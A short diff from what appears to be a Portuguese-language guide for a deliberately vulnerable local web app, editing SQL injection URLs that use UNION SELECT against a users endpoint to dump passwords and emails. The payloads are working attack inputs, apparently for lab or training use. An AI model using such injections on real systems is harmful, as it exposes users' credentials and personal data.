@@ -52,7 +52,7 @@ http://localhost:3000
 **Exploit:**
 ```bash
 # Ver todas as senhas do sistema
-http://localhost:3000/api/users?q=' UNION SELECT id, name, password FROM users --
+http://localhost:3000/api/users?q=' UNION SELECT NULL, email, password FROM users #
 
 # Ver emails de todos
 http://localhost:3000/api/users?q=' UNION SELECT id, name, email FROM users --
